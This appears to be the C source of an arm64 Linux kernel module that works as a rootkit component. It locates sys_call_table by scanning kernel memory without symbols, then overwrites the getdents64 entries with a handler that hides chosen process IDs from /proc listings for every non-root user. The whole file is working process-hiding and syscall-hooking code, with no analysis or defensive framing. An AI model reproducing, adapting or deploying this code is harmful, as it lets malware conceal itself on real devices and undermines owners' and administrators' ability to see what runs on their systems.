#include "wuwa_syshook.h"
#include "wuwa_hide.h"

#include <asm/barrier.h>
#include <asm/extable.h>
#include <asm/sysreg.h>
#include <linux/compiler.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>

#ifndef __NR_getdents64
#define __NR_getdents64 61 /* arm64 stable ABI */
#endif

/* Local dirent layout (stable userspace ABI, no header roulette). */
struct wuwa_dirent64 {
    u64 d_ino;
    s64 d_off;
    u16 d_reclen;
    u8 d_type;
    char d_name[];
};

/* Max single getdents64 result we filter; larger reads pass through
 * unfiltered (documented; /proc readers use small counts). */
#define WUWA_DENTS_CAP (131072u)

typedef asmlinkage long (*getdents64_fn)(unsigned int fd,
                                         void __user *dirent,
                                         unsigned int count);

static getdents64_fn orig_getdents64;
#define SYSHOOK_MAX_TABLES 2
static unsigned long *hook_tables[SYSHOOK_MAX_TABLES];
static getdents64_fn hook_origs[SYSHOOK_MAX_TABLES];
static int hook_ntables;
static int hook_active;
static DEFINE_SPINLOCK(syshook_lock);

/* ---- hidden-set aware filter (runs in syscall context) ---- */
static bool name_is_hidden_pid(const char *name, unsigned int maxlen)
{
    unsigned long v = 0;
    unsigned int i = 0;

    if (maxlen == 0)
        return false;
    while (i < maxlen && name[i]) {
        if (name[i] < '0' || name[i] > '9')
            return false;
        v = v * 10 + (unsigned int)(name[i] - '0');
        if (v > 0x7fffffffUL)
            return false;
        i++;
    }
    if (i == 0 || i >= maxlen)
        return false;
    return wuwa_hide_contains((pid_t)v);
}

asmlinkage long wuwa_getdents64(unsigned int fd,
                                struct wuwa_dirent64 __user *dirent,
                                unsigned int count)
{
    getdents64_fn orig;
    long ret;
    char *kbuf;
    long bpos, kept;
    bool module_held = false;

    orig = READ_ONCE(orig_getdents64);
    if (!orig)
        return -ENOSYS;
    ret = orig(fd, dirent, count);
    if (ret <= 0)
        return ret;
    /* Root sees everything (debugging); everyone else gets filtered. */
    if (uid_eq(current_euid(), GLOBAL_ROOT_UID))
        return ret;
    if (!try_module_get(THIS_MODULE))
        return ret; /* teardown race: passthrough, never crash */
    module_held = true;
    if ((unsigned long)ret > WUWA_DENTS_CAP)
        goto out_put;
    kbuf = kmalloc((size_t)ret, GFP_KERNEL);
    if (!kbuf)
        goto out_put;
    if (copy_from_user(kbuf, dirent, (size_t)ret)) {
        kfree(kbuf);
        ret = -EFAULT;
        goto out_put_nofree;
    }
    bpos = 0;
    kept = ret;
    while (bpos < kept) {
        u16 reclen;
        unsigned int namelen;
        if (kept - bpos < 19)
            break;
        reclen = (u16)((u8)kbuf[bpos + 16] | ((u16)(u8)kbuf[bpos + 17] << 8));
        if (reclen < 19 || bpos + reclen > kept)
            break; /* corrupt record: stop filtering, keep rest as-is */
        namelen = reclen - 19;
        if (namelen > 0 && namelen < 256 &&
            name_is_hidden_pid(kbuf + bpos + 19, namelen)) {
            if (kept > bpos + reclen)
                memmove(kbuf + bpos, kbuf + bpos + reclen,
                        (size_t)(kept - (bpos + reclen)));
            kept -= reclen;
            continue;
        }
        bpos += reclen;
    }
    if (copy_to_user(dirent, kbuf, (size_t)kept))
        kept = -EFAULT;
    kfree(kbuf);
    ret = kept;
out_put_nofree:
    (void)0;
out_put:
    if (module_held)
        module_put(THIS_MODULE);
    return ret;
}

/* Fault-safe kernel reads without imports: probe_kernel_read is not
 * exported on some vendor kernels (proven: Samsung 5.15), so use
 * exception-table-guarded loads (arm64 relative extable entries, same
 * shape as __get_user; sorted into extable at load). No symbols needed,
 * works everywhere. */
static int safe_read64(const void *src, unsigned long *dst)
{
    unsigned long v;
    int err = -EFAULT;
    asm volatile(
        "1: ldr %1, [%2]\n"
        "   mov %w0, #0\n"
        "2:\n"
        "   .pushsection __ex_table, \"a\"\n"
        "   .balign 4\n"
        "   .long (1b - .), (2b - .)\n"
        "   .popsection\n"
        : "+r" (err), "=r" (v) : "r" (src) : "memory");
    if (!err)
        *dst = v;
    return err;
}

static int safe_read32(const void *src, unsigned int *dst)
{
    unsigned int v;
    int err = -EFAULT;
    asm volatile(
        "1: ldr %w1, [%2]\n"
        "   mov %w0, #0\n"
        "2:\n"
        "   .pushsection __ex_table, \"a\"\n"
        "   .balign 4\n"
        "   .long (1b - .), (2b - .)\n"
        "   .popsection\n"
        : "+r" (err), "=r" (v) : "r" (src) : "memory");
    if (!err)
        *dst = v;
    return err;
}

/* ---- table discovery: pointer-run signature + prologue validation ---- */
static bool prologue_ok(u32 w)
{
    if ((w & 0xfffffc00u) == 0xd5032400u)
        return true; /* bti / bti c / bti j */
    if (w == 0xd50323bfu)
        return true; /* paciasp */
    if (w == 0xa9be7bfdu || w == 0xa9bf7bfdu)
        return true; /* stp x29, x30, [sp, #-16/-32]! */
    if (w == 0x910003fdu)
        return true; /* mov x29, sp */
    if ((w & 0xffc00000u) == 0xd1000000u)
        return true; /* sub sp, sp, #imm */
    return false;
}

#define SCAN_MIN_RUN 400
#define SCAN_SAMPLE_EVERY 16
#define SCAN_SAMPLE_NEED 20
#define SCAN_SAMPLE_TOTAL 24
#define SCAN_DISTINCT_NEED 200

static int scan_run_score(unsigned long base, unsigned long *distinct_out)
{
    unsigned long v, prev = 0;
    unsigned long distinct = 0, ascents = 0;
    int ok = 0, sampled = 0, i = 0;
    unsigned int w;
    /* base points at run start; run length already established by caller
     * (SCAN_MIN_RUN consecutive in-window pointers). Sample prologues,
     * distinctness, and order. Sorted runs (kallsyms_addresses) are
     * rejected: syscall tables are unordered. */
    for (i = 0; i < SCAN_MIN_RUN; i += SCAN_SAMPLE_EVERY) {
        if (sampled >= SCAN_SAMPLE_TOTAL)
            break;
        if (safe_read64((void *)(base + (unsigned long)i * 8), &v))
            return -1;
        if (sampled > 0 && v >= prev)
            ascents++;
        if (v != prev) {
            distinct++;
            prev = v;
        }
        if (!safe_read32((void *)v, &w) && prologue_ok(w))
            ok++;
        sampled++;
    }
    if (sampled < SCAN_SAMPLE_TOTAL || ok < SCAN_SAMPLE_NEED)
        return 0;
    if (ascents >= SCAN_SAMPLE_TOTAL - 2)
        return 0; /* sorted: not a syscall table */
    *distinct_out = distinct;
    return distinct >= SCAN_DISTINCT_NEED ? 1 : 0;
}

/* Locate sys_call_table without symbols: VBAR gives a kernel-text anchor;
 * tables are long runs of in-window function pointers with valid
 * prologues. Up to SYSHOOK_MAX_TABLES candidates (main + compat: hooking
 * both also covers 32-bit readers); sorted runs (kallsyms) rejected.
 * Returns candidate count, 0 = NO-GO. */
static int find_syscall_tables(unsigned long *out, int cap)
{
    unsigned long vbar, lo, hi, a, run = 0;
    int found = 0;
    unsigned long distinct = 0;
    unsigned long v;

    if (cap <= 0)
        return 0;
    vbar = read_sysreg(vbar_el1);
    if (vbar < (1UL << 40))
        return 0; /* sanity: kernel text lives high */
    lo = (vbar & ~((1UL << 21) - 1)) - (1UL << 21);
    hi = vbar + (128UL << 20);
    for (a = lo; a + 8 <= hi; a += 8) {
        if (safe_read64((void *)a, &v)) {
            run = 0;
            continue;
        }
        if (v >= lo && v <= hi && (v & 7) == 0) {
            run++;
            if (run == SCAN_MIN_RUN) {
                int sc = scan_run_score(a - (SCAN_MIN_RUN - 1) * 8,
                                        &distinct);
                if (sc > 0) {
                    if (found < cap)
                        out[found] = a - (SCAN_MIN_RUN - 1) * 8;
                    found++;
                } else if (sc < 0) {
                    run = 0;
                }
                /* keep scanning to prove uniqueness bound */
            }
            continue;
        }
        run = 0;
    }
    return found;
}

int wuwa_hide_install(void)
{
    unsigned long found[SYSHOOK_MAX_TABLES];
    int n, i, installed = 0;
    unsigned long flags;
    unsigned int w;

    spin_lock_irqsave(&syshook_lock, flags);
    if (hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    spin_unlock_irqrestore(&syshook_lock, flags);

    /* Scan without the lock (seconds worst case, fault-safe probes). */
    n = find_syscall_tables(found, SYSHOOK_MAX_TABLES);
    if (n <= 0 || n > SYSHOOK_MAX_TABLES)
        return -ESRCH;

    spin_lock_irqsave(&syshook_lock, flags);
    if (hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    for (i = 0; i < n; i++) {
        unsigned long *table = (unsigned long *)found[i];
        unsigned long orig;
        if (safe_read64(&table[__NR_getdents64], &orig))
            continue;
        /* Pre-write sanity: current entry must look like code. */
        if (safe_read32((void *)orig, &w) || !prologue_ok(w))
            continue;
        hook_tables[installed] = table;
        hook_origs[installed] = (getdents64_fn)orig;
        WRITE_ONCE(table[__NR_getdents64], (unsigned long)wuwa_getdents64);
        installed++;
    }
    smp_wmb();
    /* Verify every write; roll back all on any mismatch. */
    for (i = 0; i < installed; i++) {
        if (hook_tables[i][__NR_getdents64] !=
            (unsigned long)wuwa_getdents64) {
            int j;
            for (j = 0; j < installed; j++)
                WRITE_ONCE(hook_tables[j][__NR_getdents64],
                           (unsigned long)hook_origs[j]);
            for (j = 0; j < installed; j++) {
                hook_tables[j] = NULL;
                hook_origs[j] = NULL;
            }
            hook_ntables = 0;
            spin_unlock_irqrestore(&syshook_lock, flags);
            return -EIO;
        }
    }
    if (!installed) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return -EINVAL;
    }
    orig_getdents64 = hook_origs[0];
    hook_ntables = installed;
    hook_active = 1;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return 0;
}

int wuwa_hide_uninstall(void)
{
    unsigned long flags;
    int i, bad = 0;

    spin_lock_irqsave(&syshook_lock, flags);
    if (!hook_active) {
        spin_unlock_irqrestore(&syshook_lock, flags);
        return 0;
    }
    for (i = 0; i < hook_ntables; i++)
        WRITE_ONCE(hook_tables[i][__NR_getdents64],
                   (unsigned long)hook_origs[i]);
    smp_wmb();
    for (i = 0; i < hook_ntables; i++) {
        if (hook_tables[i][__NR_getdents64] !=
            (unsigned long)hook_origs[i])
            bad = 1;
        hook_tables[i] = NULL;
        hook_origs[i] = NULL;
    }
    orig_getdents64 = NULL;
    hook_ntables = 0;
    hook_active = 0;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return bad ? -EIO : 0;
}

int wuwa_hide_active(void)
{
    int a;
    unsigned long flags;

    spin_lock_irqsave(&syshook_lock, flags);
    a = hook_active;
    spin_unlock_irqrestore(&syshook_lock, flags);
    return a;
}
